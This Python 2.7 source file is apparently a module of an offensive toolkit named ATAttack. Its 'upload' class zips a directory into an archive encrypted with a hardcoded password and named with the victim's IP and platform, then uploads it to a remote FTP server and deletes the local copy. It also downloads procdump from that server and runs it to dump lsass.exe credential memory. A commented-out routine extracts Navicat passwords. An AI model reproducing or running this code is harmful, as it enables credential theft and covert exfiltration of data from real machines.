#! /usr/bin/env python2.7
# -*- coding:UTF-8 -*-

import pyminizip
import random
import string
import socket
import zipfile
import platform
import ftplib

from ATAttack.framework.prints import *
from ATAttack.framework.constant import constant
import os


def str_rangdom():
    return ''.join(random.sample(string.ascii_letters + string.digits,8))

random_exe = str_rangdom() + ".exe"
random_zip = str_rangdom() + "_" + ".zip"


class upload(object):
    def __init__(self,credentials):
        try:
            self.hostname = socket.gethostbyname(socket.gethostname())
            self.f = ftplib.FTP(credentials.host)
            self.f.login(credentials.username, credentials.password)
            print_warning('Successful connection to FTP server')
        except Exception:
            print_error("Unable to connect to FTP server")
            pass


    def random_str(self):

        ip_address = self.hostname
        file_name = str_rangdom() + "_" + ip_address + "_" + platform.platform()
        return file_name

    def zipDir(self,dirpath, outFullName):
        try:
            zip = zipfile.ZipFile(outFullName, "w", zipfile.ZIP_DEFLATED)
            for path, dirnames, filenames in os.walk(dirpath):
                fpath = path.replace(dirpath, '')
                for filename in filenames:
                    if filename.endswith(".exe"):
                        pass
                    elif filename.endswith(".zip"):
                        pass
                    elif filename.endswith(".rar"):
                        pass
                    else:
                        zip.write(
                            os.path.join(
                                path, filename), os.path.join(
                                fpath, filename))
            zip.close()
        except Exception:
            pass

    def zip_encrypt(self,dirpath):
        self.zipDir(dirpath, random_zip)
        compression_level = 9
        filename = random_zip
        path = self.random_str()
        pyminizip.compress(filename, "", path,
                           "Za!@#$@&**(aKg", compression_level)
        os.remove(random_zip)
        return path


    def ftp_upload(self,file_remote):
        try:
            # if os.path.getsize(constant.dump_name) == 0:
            #     print_error(
            #         'Export failed. Attempt to download procdump export remotely')
            #     print_error("Try procdump export again")
            #     file_exe = self.download(constant.lsass_name, random_exe)
            #     # file_path = os.path.join(os.getcwd() + "\\" + constant.dump_name)
            #     os.popen(file_exe +" -accepteula -ma lsass.exe " +constant.dump_name)
            #     os.remove(random_exe)
            #     print_success('Successfully exported lsass.exe process')
            file_local = file_remote
            bufsize = 1024
            fp = open(file_local, 'rb')
            self.f.storbinary('STOR ' + file_remote, fp, bufsize)
            fp.close()
            # f.quit()
            os.remove(file_remote)
        except Exception:
            return False

    def download(self,remote, local):
        try:
            bufsize = 1024
            fp = open(local, 'wb')
            self.f.retrbinary('RETR %s' % remote, fp.write, bufsize)
            fp.close()
            return local
        except Exception:
            return False

    def lsass_dump(self):
        try:
            print_error(
                'Export failed. Attempt to download procdump export remotely')
            print_error("Try procdump export again")
            file_exe = self.download(constant.lsass_name, random_exe)
            # file_path = os.path.join(os.getcwd() + "\\" + constant.dump_name)
            os.popen(file_exe +" -accepteula -ma lsass.exe " +
                constant.dump_name)
            os.remove(random_exe)
            print_success('Successfully exported lsass.exe process')
            # dump = zipfile.ZipFile(random_zip, 'w', zipfile.ZIP_DEFLATED)
            # dump.write(file_path, constant.dump_name)
            # dump.close()
            # ftp_upload(random_zip)
            # os.remove(constant.dump_name)
            # os.remove(file_exe)
        except Exception:
            print_error("Export lsass.exe failed")

    # def navicatpwd(self):
    #
    #     self.download(constant.Navicat, random_exe)
    #     print_success("Successful Access to Navicat Password : ")
    #     if os.path.getsize(random_exe) == 0:
    #         os.remove(random_exe)
    #     else:
    #         print_success(os.popen(random_exe).read())
    #         os.remove(random_exe)


